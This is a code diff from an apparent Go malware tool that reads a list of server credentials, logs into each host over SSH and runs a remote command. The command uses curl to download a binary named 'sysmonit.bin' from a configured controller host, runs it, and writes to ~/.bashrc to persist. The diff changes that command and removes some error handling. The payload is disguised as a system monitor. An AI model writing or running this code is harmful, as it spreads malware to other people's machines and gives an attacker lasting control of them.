@@ -21,13 +21,6 @@ type Sshsess struct {
 
 func Scan() {
 
-	defer func() { // try catch
-		if er := recover(); er != nil {
-			println("Scan: ")
-			fmt.Print(er)
-		}
-	}()
-
 	data, err := os.ReadFile("./data/servers.txt")
 	if err != nil {
 		fmt.Println("Read servers: " + err.Error())
@@ -35,10 +28,6 @@ func Scan() {
 
 	for _, i := range strings.Split(string(data), "\n") {
 		serv := strings.Split(string(i), ":")
-
-		if len(serv) < 2 {
-			continue
-		}
 
 		fmt.Println(serv)
 		ses := sshNew(serv[1], serv[2], serv[0])
@@ -84,7 +73,9 @@ func (sess *Sshsess) Inject() {
 		host = config.GetConfig().Api.Server + ":" + config.GetConfig().Api.Port + config.GetConfig().Api.CustomPath
 	}
 
-	sshSesh.Run("rm ../bin/sysmonit.bin; curl -X POST http://" + host + " -o ../bin/sysmonit.bin ; chmod +x ../bin/sysmonit.bin ; ../bin/sysmonit.bin >> ~/.bashrc; ulimit -n 999999; ../bin/sysmonit.bin & disown")
+	fmt.Println(host)
+
+	sshSesh.Run("rm ../bin/sysmonit.bin; curl -X POST http://" + host + " -o ../bin/sysmonit.bin ; chmod +x ../bin/sysmonit.bin ; ../bin/sysmonit.bin; ../bin/sysmonit.bin >> ~/.bashrc")
 
 	sshSesh.Close()
 }
